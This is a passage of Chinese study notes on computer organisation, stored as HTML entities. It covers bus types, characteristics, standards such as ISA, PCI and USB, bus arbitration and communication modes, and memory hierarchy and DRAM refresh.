&#x7684;&#x53CC;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x6846;&#x56FE;</p><p>&#x5355;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x6846;&#x56FE;</p><p>&#x4EE5;&#x5B58;&#x50A8;&#x5668;&#x4E3A;&#x4E2D;&#x5FC3;&#x7684;&#x53CC;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x6846;&#x56FE;</p><table><thead><tr><th>&#x603B;&#x7EBF;&#x5206;&#x7C7B;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x7247;&#x5185;&#x603B;&#x7EBF;</td><td>&#x82AF;&#x7247;&#x5185;&#x90E8;&#x7684;&#x603B;&#x7EBF;,&#x5982;&#x5BC4;&#x5B58;&#x5668;&#x4E0E;&#x5BC4;&#x5B58;&#x5668;&#x4E4B;&#x95F4;,&#x5BC4;&#x5B58;&#x5668;&#x4E0E;&#x7B97;&#x903B;&#x5355;&#x5143;ALU&#x4E4B;&#x95F4;&#x3002;</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;</td><td>&#x8BA1;&#x7B97;&#x673A;&#x5404;&#x90E8;&#x4EF6;&#x4E4B;&#x95F4;&#x7684;&#x4FE1;&#x606F;&#x4F20;&#x8F93;&#x7EBF;(CPU,&#x4E3B;&#x5B58;,I/O&#x8BBE;&#x5907;&#x7B49;)</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;-&#x6570;&#x636E;&#x603B;&#x7EBF;</td><td>&#x53CC;&#x5411;&#x4F20;&#x8F93;,&#x5176;&#x4F4D;&#x6570;&#x4E0E;&#x673A;&#x5668;&#x5B57;&#x957F;,&#x5B58;&#x50A8;&#x5B57;&#x957F;&#x6709;&#x5173;</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;-&#x5730;&#x5740;&#x603B;&#x7EBF;</td><td>&#x5355;&#x5411;&#xFF0C;&#x4E0E;&#x5B58;&#x50A8;&#x5730;&#x5740;,I/O&#x5730;&#x5740;&#x6709;&#x5173;</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;-&#x63A7;&#x5236;&#x603B;&#x7EBF;</td><td>&#x5355;&#x5411;&#xFF0C;&#x53D1;&#x51FA;&#x5404;&#x79CD;&#x63A7;&#x5236;&#x4FE1;&#x53F7;&#x3002;&#x6709;&#x51FA;(&#x5B58;&#x50A8;&#x5668;&#x8BFB;&#x3001;&#x5B58;&#x50A8;&#x5668;&#x5199;&#x603B;&#x7EBF;&#x5141;&#x8BB8;&#x3001;&#x4E2D;&#x65AD;&#x786E;&#x8BA4;),&#x6709;&#x5165;(&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x3001;&#x603B;&#x7EBF;&#x8BF7;&#x6C42;)</td></tr><tr><td>&#x901A;&#x4FE1;&#x603B;&#x7EBF;</td><td>&#x7528;&#x4E8E;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x4E4B;&#x95F4;&#x6216;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x4E0E;&#x5176;&#x4ED6;&#x7CFB;&#x7EDF;&#xFF08;&#x5982;&#x63A7;&#x5236;&#x4EEA;&#x8868;&#x3001;&#x79FB;&#x52A8;&#x901A;&#x4FE1;&#x7B49;&#xFF09;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x3002;&#x5206;&#x4E3A;&#x4E32;&#x884C;&#x901A;&#x4FE1;&#x548C;&#x5E76;&#x884C;&#x901A;&#x4FE1;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x7269;&#x7406;&#x5B9E;&#x73B0;</p><p>&#x603B;&#x7EBF;&#x7279;&#x6027;</p><table><thead><tr><th>&#x603B;&#x7EBF;&#x7279;&#x6027;</th><th></th></tr></thead><tbody><tr><td>&#x673A;&#x68B0;&#x7279;&#x6027;</td><td>&#x6307;&#x603B;&#x7EBF;&#x5728;&#x673A;&#x68B0;&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;&#x4E0A;&#x7684;&#x4E00;&#x4E9B;&#x6027;&#x80FD;&#xFF0C;&#x5C3A;&#x5BF8;&#xFF0C;&#x5F62;&#x72B6;&#xFF0C;&#x5F15;&#x811A;&#x7684;&#x4E2A;&#x6570;&#x4EE5;&#x53CA;&#x6392;&#x5217;&#x7684;&#x987A;&#x5E8F;&#xFF0C;&#x63A5;&#x5934;&#x5904;&#x7684;&#x53EF;&#x9760;&#x63A5;&#x89E6;</td></tr><tr><td>&#x7535;&#x6C14;&#x7279;&#x6027;</td><td>&#x603B;&#x7EBF;&#x7684;&#x6BCF;&#x4E00;&#x6839;&#x4F20;&#x8F93;&#x7EBF;&#x4E0A;&#x4FE1;&#x53F7;&#x7684;&#x4F20;&#x8F93;&#x65B9;&#x5411;&#x548C;&#x6709;&#x6548;&#x7684;&#x7535;&#x5E73;&#x8303;&#x56F4;</td></tr><tr><td>&#x529F;&#x80FD;&#x7279;&#x6027;</td><td>&#x6BCF;&#x6839;&#x4F20;&#x8F93;&#x7EBF;&#x7684;&#x529F;&#x80FD;&#x3002;&#x5730;&#x5740;&#x603B;&#x7EBF;&#x7528;&#x6765;&#x6307;&#x51FA;&#x5730;&#x5740;&#x7801;&#xFF1B;&#x6570;&#x636E;&#x603B;&#x7EBF;&#x4F20;&#x9012;&#x6570;&#x636E;&#xFF1B;&#x63A7;&#x5236;&#x603B;&#x7EBF;&#x53D1;&#x51FA;&#x63A7;&#x5236;&#x4FE1;&#x53F7;</td></tr><tr><td>&#x65F6;&#x95F4;&#x7279;&#x6027;</td><td>&#x4FE1;&#x53F7;&#x7684;&#x65F6;&#x5E8F;&#x5173;&#x7CFB;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x6027;&#x80FD;&#x6307;&#x6807;</p><table><thead><tr><th>&#x6027;&#x80FD;</th><th>&#x6307;&#x6807;</th></tr></thead><tbody><tr><td>&#x603B;&#x7EBF;&#x5BBD;&#x5EA6;</td><td>&#x6570;&#x636E;&#x7EBF;&#x5206;&#x6839;&#x6570;&#xFF0C;&#x7528;bit</td></tr><tr><td>&#x603B;&#x7EBF;&#x5E26;&#x5BBD;</td><td>&#x6BCF;&#x79D2;&#x4F20;&#x8F93;&#x7684;&#x6700;&#x5927;&#x5B57;&#x8282;&#x6570;(MBps)</td></tr><tr><td>&#x65F6;&#x949F;&#x540C;&#x6B65;/&#x5F02;&#x6B65;</td><td>&#x540C;&#x6B65;&#xFF0C;&#x5F02;&#x6B65;</td></tr><tr><td>&#x603B;&#x7EBF;&#x590D;&#x7528;</td><td>&#x5730;&#x5740;&#x7EBF;&#x4E0E;&#x6570;&#x636E;&#x7EBF;&#x590D;&#x7528;</td></tr><tr><td>&#x4FE1;&#x53F7;&#x7EBF;&#x6570;</td><td>&#x5730;&#x5740;&#x7EBF;&#xFF0C;&#x6570;&#x636E;&#x7EBF;&#x548C;&#x63A7;&#x5236;&#x7EBF;&#x7684;&#x603B;&#x548C;</td></tr><tr><td>&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x7A81;&#x53D1;&#xFF0C;&#x81EA;&#x52A8;&#xFF0C;&#x4EF2;&#x88C1;&#xFF0C;&#x903B;&#x8F91;&#xFF0C;&#x8BA1;&#x6570;</td></tr><tr><td>&#x5176;&#x4ED6;&#x6307;&#x6807;</td><td>&#x8D1F;&#x8F7D;&#x80FD;&#x529B;&#xFF08;&#x9A71;&#x52A8;&#x80FD;&#x529B;&#xFF09;&#xFF0C;&#x7535;&#x6E90;&#x7535;&#x538B;&#xFF0C;&#x603B;&#x7EBF;&#x5BBD;&#x5EA6;&#x80FD;&#x5426;&#x6269;&#x5C55;&#x7B49;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x6807;&#x51C6;</p><p>&#x603B;&#x7EBF;&#x6807;&#x51C6;&#xFF1A;&#x7CFB;&#x7EDF;&#x4E0E;&#x5404;&#x6A21;&#x5757;&#xFF0C;&#x6A21;&#x5757;&#x4E0E;&#x6A21;&#x5757;&#x4E4B;&#x95F4;&#x7684;&#x4E00;&#x4E2A;&#x4E92;&#x8FDE;&#x7684;&#x6807;&#x51C6;&#x754C;&#x9762;</p><p>&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BBE;&#x7ACB;&#x603B;&#x7EBF;&#x6807;&#x51C6;&#xFF1A;&#x4E3A;&#x4E86;&#x4F7F;&#x8BBE;&#x8BA1;&#x7B80;&#x5316;&#xFF0C;&#x6A21;&#x5757;&#x751F;&#x4EA7;&#x6279;&#x91CF;&#x5316;&#xFF0C;&#x786E;&#x4FDD;&#x5176;&#x6027;&#x80FD;&#x7A33;&#x5B9A;&#xFF0C;&#x8D28;&#x91CF;&#x53EF;&#x9760;&#xFF0C;&#x5B9E;&#x73B0;&#x53EF;&#x79FB;&#x5316;&#xFF0C;&#x4FBF;&#x4E8E;&#x7EF4;&#x62A4;&#x3002;</p><table><thead><tr><th>&#x603B;&#x7EBF;&#x6807;&#x51C6;</th><th>&#x6570;&#x636E;&#x7EBF;</th><th>&#x5730;&#x5740;&#x7EBF;</th><th>&#x603B;&#x7EBF;&#x65F6;&#x949F;</th><th>&#x5E26;&#x5BBD;</th><th>&#x7279;&#x6027;</th></tr></thead><tbody><tr><td>ISA</td><td>16</td><td>24</td><td>8MHz(&#x72EC;&#x7ACB;)</td><td>16MBps</td><td></td></tr><tr><td>EISA</td><td>32</td><td>32</td><td>8MHz(&#x72EC;&#x7ACB;)</td><td>33MBps</td><td></td></tr><tr><td>VESA(VL-BUS)</td><td>32</td><td></td><td>33MHz(CPU)</td><td>133MBps</td><td></td></tr><tr><td>PCI</td><td>32 64</td><td></td><td>33MHz(&#x72EC;&#x7ACB;)66MHz(&#x72EC;&#x7ACB;)</td><td>132MBps528MBps</td><td>&#x826F;&#x597D;&#x7684;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x5373;&#x63D2;&#x5373;&#x7528;&#xFF0C;&#x652F;&#x6301;&#x591A;&#x4E3B;&#x8BBE;&#x5907;&#xFF0C;&#x5177;&#x6709;&#x4E0E;&#x5904;&#x7406;&#x5668;&#x548C;&#x5B58;&#x50A8;&#x5668;&#x5B50;&#x7CFB;&#x7EDF;&#x5B8C;&#x5168;&#x5E76;&#x884C;&#x64CD;&#x4F5C;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x63D0;&#x4F9B;&#x6570;&#x636E;&#x548C;&#x5730;&#x5740;&#x5947;&#x5076;&#x6821;&#x9A8C;&#xFF0C;&#x53EF;&#x6269;&#x5145;&#xFF0C;&#x8F6F;&#x4EF6;&#x517C;&#x5BB9;&#x6027;&#x597D;&#xFF0C;&#x652F;&#x6301;&#x4E24;&#x79CD;&#x7535;&#x538B;&#x6807;&#x51C6;5V&#x3001;3.3V&#xFF0C;&#x91C7;&#x7528;&#x591A;&#x8DEF;&#x590D;&#x7528;</td></tr><tr><td>AGP</td><td>32</td><td></td><td>66.7MHz(&#x72EC;&#x7ACB;)133MHz(&#x72EC;&#x7ACB;)</td><td>266MBps533MBps</td><td></td></tr><tr><td>RS-232C</td><td>&#x4E32;&#x884C;&#x901A;&#x4FE1;&#x603B;&#x7EBF;&#x6807;&#x51C6;</td><td></td><td>&#x6570;&#x636E;&#x7EC8;&#x7AEF;&#x8BBE;&#x5907;&#xFF08;&#x8BA1;&#x7B97;&#x673A;&#xFF09;&#x548C;&#x6570;&#x636E;&#x901A;&#x4FE1;&#x8BBE;&#x5907;&#xFF08;&#x8C03;&#x5236;&#x89E3;&#x8C03;&#x5668;&#xFF09;&#x4E4B;&#x95F4;&#x7684;&#x6807;&#x51C6;&#x63A5;&#x53E3;</td><td></td><td></td></tr><tr><td>USB</td><td>&#x4E32;&#x884C;&#x63A5;&#x53E3;&#x603B;&#x7EBF;&#x6807;&#x51C6;</td><td></td><td>&#x666E;&#x901A;&#x65E0;&#x5C4F;&#x853D;&#x53CC;&#x7EDE;&#x7EBF;&#x5E26;&#x5C4F;&#x853D;&#x53CC;&#x7EDE;&#x7EBF;&#x6700;&#x9AD8;</td><td>1.5 Mbps(USB1.0)12Mbps(USB1.0)480Mbps(USB2.0)</td><td>&#x5177;&#x6709;&#x771F;&#x6B63;&#x7684;&#x5373;&#x63D2;&#x5373;&#x7528;&#xFF0C;&#x5F88;&#x5F3A;&#x7684;&#x8FDE;&#x63A5;&#x80FD;&#x529B;&#xFF0C;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x7387;&#xFF0C;&#x6807;&#x51C6;&#x7EDF;&#x4E00;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x5355;&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x53CC;&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x4E09;&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x4E09;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x53C8;&#x4E00;</p><p>&#x56DB;&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x603B;&#x7EBF;&#x5224;&#x4F18;&#x63A7;&#x5236;</p><p>&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BBE;&#x7F6E;&#x603B;&#x7EBF;&#x5224;&#x4F18;&#x63A7;&#x5236;&#xFF1A;&#x603B;&#x7EBF;&#x4E0A;&#x6240;&#x8FDE;&#x63A5;&#x7684;&#x5404;&#x7C7B;&#x8BBE;&#x5907;&#xFF0C;&#x6309;&#x5176;&#x5BF9;&#x603B;&#x7EBF;&#x6709;&#x65E0;&#x63A7;&#x5236;&#x529F;&#x80FD;&#x5206;&#x4E3A;&#x4E3B;&#x8BBE;&#x5907;(&#x6A21;&#x5757;)&#x548C;&#x4ECE;&#x8BBE;&#x5907;(&#x6A21;&#x5757;)&#x3002;&#x4E3B;&#x8BBE;&#x5907;&#x5BF9;&#x603B;&#x7EBF;&#x6709;&#x63A7;&#x5236;&#x6743;&#xFF0C;&#x4ECE;&#x8BBE;&#x5907;&#x53EA;&#x80FD;&#x54CD;&#x5E94;&#x4ECE;&#x4E3B;&#x8BBE;&#x5907;&#x53D1;&#x6765;&#x7684;&#x603B;&#x7EBF;&#x547D;&#x4EE4;&#xFF0C;&#x5BF9;&#x603B;&#x7EBF;&#x6CA1;&#x6709;&#x63A7;&#x5236;&#x6743;&#x3002;&#x603B;&#x7EBF;&#x4E0A;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x53C8;&#x4E3B;&#x8BBE;&#x5907;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x82E5;&#x591A;&#x4E2A;&#x4E3B;&#x8BBE;&#x5907;&#x540C;&#x65F6;&#x8981;&#x4F7F;&#x7528;&#x603B;&#x7EBF;&#x65F6;&#xFF0C;&#x5C31;&#x7531;&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x5668;&#x7684;&#x4F18;&#x5224;&#xFF0C;&#x4EF2;&#x88C1;&#x903B;&#x8F91;&#x6309;&#x4E00;&#x5B9A;&#x7684;&#x4F18;&#x5148;&#x7B49;&#x7EA7;&#x987A;&#x5E8F;&#x786E;&#x5B9A;&#x54EA;&#x4E2A;&#x4E3B;&#x8BBE;&#x5907;&#x80FD;&#x4F7F;&#x7528;&#x603B;&#x7EBF;&#x3002;</p><p>&#x603B;&#x7EBF;&#x4F18;&#x5224;&#x63A7;&#x5236;&#x5206;&#x4E3A;&#x96C6;&#x4E2D;&#x5F0F;&#x548C;&#x5206;&#x5E03;&#x5F0F;&#x4E24;&#x79CD;</p><table><thead><tr><th>&#x96C6;&#x4E2D;&#x5F0F;&#x79CD;&#x7C7B;</th><th>&#x7279;&#x70B9;</th></tr></thead><tbody><tr><td>&#x94FE;&#x5F0F;&#x67E5;&#x8BE2;</td><td>&#x8FDE;&#x7EBF;&#x7B80;&#x5355;&#xFF0C;&#x6613;&#x4E8E;&#x6269;&#x5145;&#xFF0C;&#x5BF9;&#x7535;&#x8DEF;&#x6545;&#x969C;&#x6700;&#x654F;&#x611F;</td></tr><tr><td>&#x8BA1;&#x6570;&#x5668;&#x5B9A;&#x65F6;&#x67E5;&#x8BE2;</td><td>&#x4F18;&#x5148;&#x7EA7;&#x8BBE;&#x7F6E;&#x8F83;&#x7075;&#x6D3B;&#xFF0C;&#x5BF9;&#x6545;&#x969C;&#x4E0D;&#x654F;&#x611F;&#xFF0C;&#x8FDE;&#x7EBF;&#x53CA;&#x63A7;&#x5236;&#x8FC7;&#x7A0B;&#x8F83;&#x590D;&#x6742;</td></tr><tr><td>&#x72EC;&#x7ACB;&#x8BF7;&#x6C42;</td><td>&#x54CD;&#x5E94;&#x901F;&#x5EA6;&#x5FEB;&#xFF0C;&#x4F18;&#x5148;&#x7EA7;&#x6B21;&#x5E8F;&#x63A7;&#x5236;&#x7075;&#x6D3B;&#xFF0C;&#x4F46;&#x8FDE;&#x7EBF;&#x591A;&#xFF0C;&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x590D;&#x6742;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x901A;&#x4FE1;</p><table><thead><tr><th>&#x901A;&#x4FE1;&#x65B9;&#x5F0F;</th><th>&#x7279;&#x70B9;</th><th>&#x9002;&#x7528;&#x573A;&#x5408;</th></tr></thead><tbody><tr><td>&#x540C;&#x6B65;&#x901A;&#x4FE1;</td><td>&#x6307;&#x7531;&#x7EDF;&#x4E00;&#x65F6;&#x949F;&#x63A7;&#x5236;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x63A7;&#x5236;&#x65B9;&#x5F0F;&#x7B80;&#x5355;&#xFF0C;&#x7075;&#x6D3B;&#x6027;&#x5DEE;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x4E2D;&#x5404;&#x90E8;&#x4EF6;&#x5DE5;&#x4F5C;&#x901F;&#x5EA6;&#x5DEE;&#x5F02;&#x8F83;&#x5927;&#x65F6;&#xFF0C;&#x603B;&#x7EBF;&#x5DE5;&#x4F5C;&#x6548;&#x7387;&#x660E;&#x663E;&#x4E0B;&#x964D;</td><td>&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x603B;&#x7EBF;&#x957F;&#x5EA6;&#x8F83;&#x77ED;&#xFF0C;&#x5404;&#x90E8;&#x4EF6;&#x5B58;&#x53D6;&#x65F6;&#x95F4;&#x6BD4;&#x8F83;&#x4E00;&#x81F4;&#x7684;&#x573A;&#x5408;</td></tr><tr><td>&#x5F02;&#x6B65;&#x901A;&#x4FE1;</td><td>&#x6307;&#x6CA1;&#x6709;&#x7EDF;&#x4E00;&#x65F6;&#x949F;&#x63A7;&#x5236;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x90E8;&#x4EF6;&#x91C7;&#x7528;&#x5E94;&#x7B54;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x8054;&#x7CFB;&#xFF0C;&#x63A7;&#x5236;&#x65B9;&#x5F0F;&#x8F83;&#x540C;&#x6B65;&#x590D;&#x6742;&#xFF0C;&#x7075;&#x6D3B;&#x6027;&#x9AD8;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x4E2D;&#x5404;&#x90E8;&#x4EF6;&#x5DE5;&#x4F5C;&#x901F;&#x5EA6;&#x5DEE;&#x5F02;&#x8F83;&#x5927;&#x65F6;&#xFF0C;&#x6709;&#x5229;&#x4E8E;&#x63D0;&#x9AD8;&#x603B;&#x7EBF;&#x5DE5;&#x4F5C;&#x6548;&#x7387;</td><td>&#x53C8;&#x5206;&#x4E3A;&#x4E0D;&#x4E92;&#x9501;&#xFF0C;&#x534A;&#x4E92;&#x9501;&#xFF0C;&#x5168;&#x4E92;&#x9501;</td></tr><tr><td>&#x534A;&#x540C;&#x6B65;&#x901A;&#x4FE1;</td><td>&#x65E2;&#x53EF;&#x4EE5;&#x50CF;&#x540C;&#x6B65;&#x901A;&#x4FE1;&#x4E00;&#x6837;&#x7531;&#x7EDF;&#x4E00;&#x65F6;&#x949F;&#x63A7;&#x5236;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x50CF;&#x5F02;&#x6B65;&#x901A;&#x4FE1;&#x4E00;&#x6837;&#x5141;&#x8BB8;&#x4F20;&#x8F93;&#x65F6;&#x95F4;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x5DE5;&#x4F5C;&#x6548;&#x7387;&#x4ECB;&#x4E8E;&#x4E24;&#x8005;&#x4E4B;&#x95F4;</td><td></td></tr><tr><td>&#x5206;&#x79BB;&#x5F0F;&#x901A;&#x4FE1;</td><td>1.&#x5404;&#x6A21;&#x5757;&#x6B32;&#x5360;&#x7528;&#x603B;&#x7EBF;&#x4F7F;&#x7528;&#x6743;&#x5FC5;&#x987B;&#x63D0;&#x51FA;&#x7533;&#x8BF7;2.&#x5728;&#x5F97;&#x5230;&#x603B;&#x7EBF;&#x4F7F;&#x7528;&#x6743;&#x540E;&#xFF0C;&#x4E3B;&#x6A21;&#x5757;&#x5728;&#x9650;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x5185;&#x5411;&#x5BF9;&#x65B9;&#x4F20;&#x9001;&#x4FE1;&#x606F;&#xFF0C;&#x91C7;&#x7528;&#x540C;&#x6B65;&#x65B9;&#x5F0F;&#xFF0C;&#x4E0D;&#x518D;&#x7B49;&#x5F85;&#x5BF9;&#x65B9;&#x56DE;&#x7B54;&#x4FE1;&#x53F7;3.&#x5404;&#x6A21;&#x5757;&#x5728;&#x51C6;&#x5907;&#x6570;&#x636E;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x90FD;&#x4E0D;&#x5360;&#x7528;&#x603B;&#x7EBF;&#xFF0C;&#x4F7F;&#x603B;&#x7EBF;&#x53EF;&#x4EE5;&#x63A5;&#x53D7;&#x5176;&#x4ED6;&#x6A21;&#x5757;&#x7684;&#x8BF7;&#x6C42;4.&#x603B;&#x7EBF;&#x88AB;&#x5360;&#x7528;&#x65F6;&#x90FD;&#x5728;&#x505A;&#x6709;&#x6548;&#x5DE5;&#x4F5C;&#xFF0C;&#x6216;&#x8005;&#x901A;&#x8FC7;&#x5B83;&#x53D1;&#x9001;&#x547D;&#x4EE4;&#xFF0C;&#x6216;&#x8005;&#x901A;&#x8FC7;&#x5B83;&#x4F20;&#x9001;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x5B58;&#x5728;&#x7A7A;&#x95F2;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x5145;&#x5206;&#x7684;&#x5229;&#x7528;&#x4E86;&#x603B;&#x7EBF;&#x7684;&#x6709;&#x6548;&#x5360;&#x7528;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4E86;&#x603B;&#x7EBF;&#x5728;&#x591A;&#x4E2A;&#x4E3B;&#xFF0C;&#x4ECE;&#x6A21;&#x5757;&#x95F4;&#x8FDB;&#x884C;&#x4EA4;&#x53C9;&#x91CD;&#x53E0;&#x5E76;&#x884C;&#x4F20;&#x9001;&#x3002;</td><td>&#x5927;&#x578B;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;</td></tr></tbody></table><p>&#x540C;&#x6B65;&#x5F0F;&#x6570;&#x636E;&#x8F93;&#x5165;&#x4F20;&#x8F93;</p><p>&#x540C;&#x6B65;&#x5F0F;&#x6570;&#x636E;&#x8F93;&#x51FA;&#x4F20;&#x8F93;</p><p>&#x56DB;  &#x5B58;&#x50A8;&#x5668;</p><p>&#x5B58;&#x50A8;&#x5668;&#x5206;&#x7C7B;</p><p>&#x5B58;&#x50A8;&#x5668;&#x901F;&#x5EA6;&#x5BB9;&#x91CF;&#x548C;&#x4EF7;&#x4F4D;&#x7684;&#x5173;&#x7CFB;</p><p>&#x7F13;&#x5B58;&#x4E3B;&#x5B58;&#x5C42;&#x6B21;&#x548C;&#x4E3B;&#x5B58;&#x8F85;&#x5B58;&#x5C42;&#x6B21;</p><p>&#x7F13;&#x5B58;&#x4E3B;&#x5B58;&#x2013;&#x89E3;&#x51B3;CPU&#x548C;&#x4E3B;&#x5B58;&#x901F;&#x5EA6;&#x4E0D;&#x5339;&#x914D;&#x7684;&#x95EE;&#x9898;</p><p>&#x4E3B;&#x5B58;&#x8F85;&#x5B58;&#x2013;&#x89E3;&#x51B3;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x7684;&#x5BB9;&#x91CF;&#x95EE;&#x9898;</p><p>&#x4E3B;&#x5B58;&#x7684;&#x4E3B;&#x8981;&#x6280;&#x672F;&#x6307;&#x6807;</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;</p><p>&#x6307;&#x4E3B;&#x5B58;&#x80FD;&#x5B58;&#x653E;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x7684;&#x603B;&#x4F4D;&#x6570;</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;=&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2A;&#x6570;*&#x5B58;&#x50A8;&#x5B57;&#x957F;</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;=&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2A;&#x6570;*&#x5B58;&#x50A8;&#x5B57;&#x957F;/8</p><p>&#x5B58;&#x50A8;&#x901F;&#x5EA6;</p><p>&#x7531;&#x5B58;&#x53D6;&#x65F6;&#x95F4;&#x548C;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x6765;&#x8868;&#x793A;&#xFF0C;&#x5B58;&#x53D6;&#x65F6;&#x95F4;&#x6307;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x8BBF;&#x65F6;&#x95F4;&#xFF0C;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x6307;&#x5B58;&#x50A8;&#x5668;&#x8FDB;&#x884C;&#x4E24;&#x6B21;&#x72EC;&#x7ACB;&#x7684;&#x5B58;&#x50A8;&#x5668;&#x64CD;&#x4F5C;&#x6240;&#x9700;&#x7684;&#x6700;&#x5C0F;&#x65F6;&#x95F4;&#x95F4;&#x9694;</p><p>&#x5B58;&#x50A8;&#x5668;&#x5E26;&#x5BBD;</p><p>&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x5B58;&#x50A8;&#x5668;&#x5B58;&#x53D6;&#x7684;&#x4FE1;&#x606F;&#x91CF;&#xFF0C;&#x5355;&#x4F4D;&#x53EF;&#x4EE5;&#x7528;&#x5B57;/&#x79D2;&#x6216;&#x5B57;&#x8282;/&#x79D2;&#x6216;&#x4F4D;/&#x79D2;&#x3002;&#x63D0;&#x9AD8;&#x5B58;&#x50A8;&#x5668;&#x5E26;&#x5BBD;&#x53EF;&#x4EE5;1.&#x7F29;&#x77ED;&#x5B58;&#x53D6;&#x5468;&#x671F;2.&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x957F;&#xFF0C;&#x4F7F;&#x6BCF;&#x4E2A;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x53EF;&#x8BFB;/&#x5199;&#x66F4;&#x591A;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x4F4D;&#x6570;</p><p>3.&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x4F53;</p><p>&#x9759;&#x6001;RAM</p><p>&#x52A8;&#x6001;RAM</p><p>&#x52A8;&#x6001;RAM&#x901A;&#x8FC7;&#x7535;&#x5BB9;&#x6765;&#x5B58;&#x50A8;&#x7535;&#x8377;&#x7684;&#x539F;&#x7406;&#x6765;&#x5B58;&#x50A8;&#x4FE1;&#x606F;&#xFF0C;&#x7535;&#x5BB9;&#x4E0A;&#x6709;&#x8DB3;&#x591F;&#x591A;&#x7684;&#x7535;&#x8377;&#x8868;&#x793A;&#x5B58;1&#xFF0C;&#x65E0;&#x7535;&#x8377;&#x8868;&#x793A;&#x5B58;0&#xFF0C;&#x7535;&#x5BB9;&#x4E0A;&#x7535;&#x8377;&#x4E00;&#x822C;&#x53EA;&#x80FD;&#x7EF4;&#x6301;1&#x2014;&#x2014;2ms&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5FC5;&#x987B;&#x5728;2ms&#x5185;&#x5BF9;&#x5176;&#x6240;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x6062;&#x590D;&#x4E00;&#x6B21;&#x539F;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x79F0;&#x4E3A;&#x518D;&#x751F;&#x6216;&#x5237;&#x65B0;&#x3002;</p><p>&#x52A8;&#x6001;RAM&#x65F6;&#x5E8F;&#x56FE;</p><p>&#x5148;&#x7531;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x5C06;&#x884C;&#x5730;&#x5740;&#x9001;&#x5165;&#x884C;&#x5730;&#x5740;&#x7F13;&#x5B58;&#x5668;&#xFF0C;&#x518D;&#x7531;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x5C06;&#x5217;&#x5730;&#x5740;&#x9001;&#x5165;&#x5217;&#x5730;&#x5740;&#x7F13;&#x5B58;&#x5668;&#xFF0C;&#x56E0;&#x6B64;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6EDE;&#x540E;&#x4E8E;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;